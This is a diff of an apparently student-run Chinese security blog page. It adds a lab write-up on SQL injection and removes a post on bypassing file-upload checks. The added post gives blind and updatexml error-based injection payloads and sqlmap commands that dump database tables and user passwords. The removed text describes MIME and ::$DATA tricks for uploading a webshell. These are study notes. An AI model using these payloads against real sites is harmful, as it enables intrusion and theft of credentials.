@@ -71,6 +71,85 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql注入4" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/03/09/sql%E6%B3%A8%E5%85%A54/" class="article-date">
+  <time class="dt-published" datetime="2026-03-09T10:57:38.000Z" itemprop="datePublished">2026-03-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/03/09/sql%E6%B3%A8%E5%85%A54/">sql注入4</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h3 id="例一"><a href="#例一" class="headerlink" title="例一"></a>例一</h3><p><img src="/../images/sql%E6%B3%A8%E5%85%A54/1.png" alt="1"></p>
+<p>这里使用bp抓包</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A54/2.png" alt="2"></p>
+<p>给uname与passwd传值,uname&#x3D;1”) or 1&#x3D;1时页面返回正常，所以应为双引号加括号闭合</p>
+<h4 id="法一-（手工注入）"><a href="#法一-（手工注入）" class="headerlink" title="法一  （手工注入）"></a>法一  （手工注入）</h4><p>输入1”) or length(database())&#x3D;8#</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A54/3.png" alt="3"></p>
+<p>页面显示正常说明数据库长度为8，输入1”) or ascii(mid(database(),1,1))&#x3D;115#，通过页面返回的正常与否判断数据库的名称</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A54/4.png" alt="4"></p>
+<h4 id="法二（使用sqlmap）"><a href="#法二（使用sqlmap）" class="headerlink" title="法二（使用sqlmap）"></a>法二（使用sqlmap）</h4><p>将用bp抓到的数据包发送到repeat模块后传出数据包保存到文件夹命名为1.text</p>
+<p>打开sqlmap 输入 python sqlmap -r “1.text文件的地址”  –batch </p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A54/5.png" alt="5"></p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A54/6.png" alt="6"></p>
+<p>发现报错，意思是sqlmap没有检测到可注入的参数，可以尝试将level修改为6（默认level&#x3D;1）</p>
+<p>输入 python sqlmap -r “1.text文件的地址”  –batch –level&#x3D;5</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A54/7.png" alt="7"></p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A54/8.png" alt="8"></p>
+<p>得到数据库、PHP、Apache的版本信息，说明存在sql注入</p>
+<p>输入python sqlmap.py -r “D:\ygfdgyhdfgddg\1\1.txt” –batch –level&#x3D;5 –dbs 查询数据库</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A54/9.png" alt="9"></p>
+<p>输入python sqlmap.py -r “D:\ygfdgyhdfgddg\1\1.txt” –batch –level&#x3D;5 -D  security _tables 查询对应数据库的表名</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A54/10.png" alt="10"></p>
+<p>输入python sqlmap.py -r “D:\ygfdgyhdfgddg\1\1.txt” –batch –level&#x3D;5 -D security -T users –dumb查询数据</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A54/11.png" alt="11"></p>
+<h4 id="例二"><a href="#例二" class="headerlink" title="例二"></a>例二</h4><p><img src="/../images/sql%E6%B3%A8%E5%85%A54/12.png" alt="12"></p>
+<p>这关发现不管怎么在uname注入都没有用，查了一下资料发现这一关的原理是先用select语句搜索用户输入的用户名，有一个check_input函数对用户输入的用户名进行了过滤，所以我们无法在uname字段进行注入，只有select语句生效，也就是搜索到正确的用户名才会执行update语句。</p>
+<p>用bp抓包发送到repeater模块</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A54/13.png" alt="13"></p>
+<p>让uname&#x3D;admin发现，只要passwd不含单引号，页面都返回正常，如果passwd包含单引号，页面报错</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A54/14.png" alt="14"></p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A54/15.png" alt="15"></p>
+<p>通过报错信息判断闭合方式为单引号闭合，尝试报错注入</p>
+<p>让passwd&#x3D;1’ and updatexml(1,concat(1,database()),1)#</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A54/16.png" alt="16"></p>
+<p>让passwd&#x3D;1’ and updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’)),1)#</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A54/17.png" alt="17"></p>
+<p>让passwd&#x3D;1’ and updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ )),1)#</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A54/19.png" alt="19"></p>
+<p>让passwd&#x3D;1’ and updatexml(1,concat(1,(select group_concat(username,id,password) from users)),1)#</p>
+<p>发现报错，不知道什么原因</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A54/20.png" alt="20"></p>
+<p>查了一下：当在 MySQL 中执行 <em>UPDATE</em> 或 <em>DELETE</em> 操作时，如果子查询直接引用了目标表，会出现错误：<em>You can’t specify target table ‘sys_campus_bill’ for update in FROM clause</em>。这是因为 MySQL 不允许在同一语句中同时查询和更新同一张表。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/03/09/sql%E6%B3%A8%E5%85%A54/" data-id="cuidCpnbXuSoOihrk0C3laFr4" data-title="sql注入4" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-sql注入3" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2026/03/03/sql%E6%B3%A8%E5%85%A53/" class="article-date">
@@ -137,7 +216,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/03/03/sql%E6%B3%A8%E5%85%A53/" data-id="cuidndrWvZEn_MjQgmR3Z3Z3c" data-title="sql注入3" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/03/03/sql%E6%B3%A8%E5%85%A53/" data-id="cuidZx7jL8XeqDnPqNoq6dR0P" data-title="sql注入3" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -253,7 +332,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/02/23/sql%E6%B3%A8%E5%85%A52/" data-id="cuidXZMC741oq6MCKHYu9_oiU" data-title="sql注入2" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/02/23/sql%E6%B3%A8%E5%85%A52/" data-id="cuidaGX9wUJCjNwIvpMT_gNqW" data-title="sql注入2" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -394,7 +473,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/02/11/sql%E6%B3%A8%E5%85%A51/" data-id="cuidWJwr3saH1ww_QihCC7V1w" data-title="sql注入1" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/02/11/sql%E6%B3%A8%E5%85%A51/" data-id="cuidIgJwOaHm8bPTLrxtQBqDK" data-title="sql注入1" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -556,7 +635,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/02/02/%E6%95%B0%E6%8D%AE%E5%BA%931/" data-id="cuidDk0fSOMKAOTPFC111_PzN" data-title="数据库1" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/02/02/%E6%95%B0%E6%8D%AE%E5%BA%931/" data-id="cuidPC3fkF9vP4XZT9tk69uo9" data-title="数据库1" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -664,7 +743,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/12/29/php3/" data-id="cuidLuEx1X9WWDogy1bImbVhh" data-title="php3" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/12/29/php3/" data-id="cuidkygGpYKsO0NXsjR1Ehl-I" data-title="php3" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -765,7 +844,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/12/23/php2/" data-id="cuidAQoMGwFXAoROURcSOH3IZ" data-title="php2" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/12/23/php2/" data-id="cuidXPBn2lKIIwixN0nOUNV48" data-title="php2" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -861,7 +940,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/12/16/php1/" data-id="cuid6LBPA7wpGcimS3qRFg6A2" data-title="php1" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/12/16/php1/" data-id="cuidl1J2RNTof-Tm9jNP2nXDh" data-title="php1" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -939,7 +1018,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/12/12/html/" data-id="cuid5FMXAUQkULYXDs9N3nN-M" data-title="html" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/12/12/html/" data-id="cuidtNckgqwcXHNrozZgUd2fK" data-title="html" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -1005,72 +1084,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/12/07/%E7%AC%AC%E5%9B%9B%E5%91%A8%E7%9A%84%E7%AC%94%E8%AE%B0/" data-id="cuid5lq2IFH2_o-w8ViPsukRA" data-title="第四周的笔记" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-文件上传漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/11/22/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
-  <time class="dt-published" datetime="2025-11-22T09:34:32.000Z" itemprop="datePublished">2025-11-22</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/11/22/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">文件上传漏洞</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="如何预防（文件上传校验方式）"><a href="#如何预防（文件上传校验方式）" class="headerlink" title="如何预防（文件上传校验方式）"></a>如何预防（文件上传校验方式）</h1><h2 id="前端校验"><a href="#前端校验" class="headerlink" title="前端校验"></a>前端校验</h2><p>在浏览器校验与后端无关，无法用bp抓包（只在浏览器校验，不会发送请求）</p>
-<h2 id="WAF校验"><a href="#WAF校验" class="headerlink" title="WAF校验"></a>WAF校验</h2><p>防火墙</p>
-<h2 id="后端校验"><a href="#后端校验" class="headerlink" title="后端校验"></a>后端校验</h2><h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><p>1  检查后缀：白名单和黑名单</p>
-<p>2  检查内容：文件头，大小等</p>
-<p>3  其他</p>
-<h1 id="如何绕过"><a href="#如何绕过" class="headerlink" title="如何绕过"></a>如何绕过</h1><p>判断校验方式（属于前端校验还是后端校验）</p>
-<p>看浏览器是否有给服务器发请求</p>
-<p>上传文件后若发现左上角刷新按钮（圈圈）在转，说明向后端发送了请求，即为后端校验，反之为前端校验</p>
-<h2 id="前端校验-1"><a href="#前端校验-1" class="headerlink" title="前端校验"></a>前端校验</h2><p>所有的前端校验等于没有</p>
-<p><u><em>绕过方式</em> </u> </p>
-<p>1  可以右键网页点击检查（F12），点击设置，找到调试程序，勾选停用JavaScript，即可上传其他后缀名的文件</p>
-<p>原理：前端校验使用的编程语言为JavaScript，停用JavaScript后校验失效</p>
-<p>2  F12找到校验函数删除即可，例：onsubmit&#x3D;“return checkFile（）”，删除“return checkFile（）”即可（在谷歌与edge浏览器中一般不适用，火狐可用）</p>
-<h2 id="后端校验-1"><a href="#后端校验-1" class="headerlink" title="后端校验"></a>后端校验</h2><h2 id="MIME类型检测"><a href="#MIME类型检测" class="headerlink" title="MIME类型检测"></a>MIME类型检测</h2><p>MIME是描述消息内容类型的因特网标准，用来表示文档，文件或字节流的性质和格式。在HTTP数据包中在Content-Type字段显示</p>
-<p>常见的MIME类型（通用型）：</p>
-<p>1  超文本标记语言.html文件：text&#x2F;html</p>
-<p>2  xml文档.xml：text&#x2F;xml</p>
-<p>3  普通文本.txt：text&#x2F;plain</p>
-<p>4  PDF文档.pdf：application&#x2F;pdf</p>
-<p>5  PNG 图像.png：image&#x2F;png</p>
-<p>6  GIF图形.gif：image&#x2F;gif</p>
-<p>7  JPEG图形.jpeg.jpg：image&#x2F;jpeg</p>
-<p>绕过方式：</p>
-<p>1（后端过滤，在服务端对数据包的MIME进行检查）   用bp对网页进行抓包，选择要上传的木马文件，打开bp的拦截功能后点击上传，找到bp拦截到的数据包，找到第二个Content-Type字段，将其内容改为image&#x2F;png，例如  Content-Type：application&#x2F;octet-stream改为Content-Type：image&#x2F;png</p>
-<p>2 （后端文件名过滤，禁止上传.asp|.aspx|.php|.jsp后缀文件） 用bp对网页进行抓包，选择要上传的木马文件，打开bp的拦截功能后点击上传，找到bp拦截到的数据包，找到Content-Dispositoin，在文件明后添加：：$DATA  </p>
-<p>若源代码中存在函数检验：：$DATA若发现则替换其为空字符，则可以进行双写</p>
-<p>访问url时要将url中的$DATA删除才可正常访问</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/11/22/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-id="cuidQuQ-mZzQc23dThOl7vHiq" data-title="文件上传漏洞" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/12/07/%E7%AC%AC%E5%9B%9B%E5%91%A8%E7%9A%84%E7%AC%94%E8%AE%B0/" data-id="cuidYdIQgyjNJKCnC-QhWTQrZ" data-title="第四周的笔记" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -1118,6 +1132,10 @@
       <ul>
         
           <li>
+            <a href="/2026/03/09/sql%E6%B3%A8%E5%85%A54/">sql注入4</a>
+          </li>
+        
+          <li>
             <a href="/2026/03/03/sql%E6%B3%A8%E5%85%A53/">sql注入3</a>
           </li>
         
@@ -1131,10 +1149,6 @@
         
           <li>
             <a href="/2026/02/02/%E6%95%B0%E6%8D%AE%E5%BA%931/">数据库1</a>
-          </li>
-        
-          <li>
-            <a href="/2025/12/29/php3/">php3</a>
           </li>
         
       </ul>
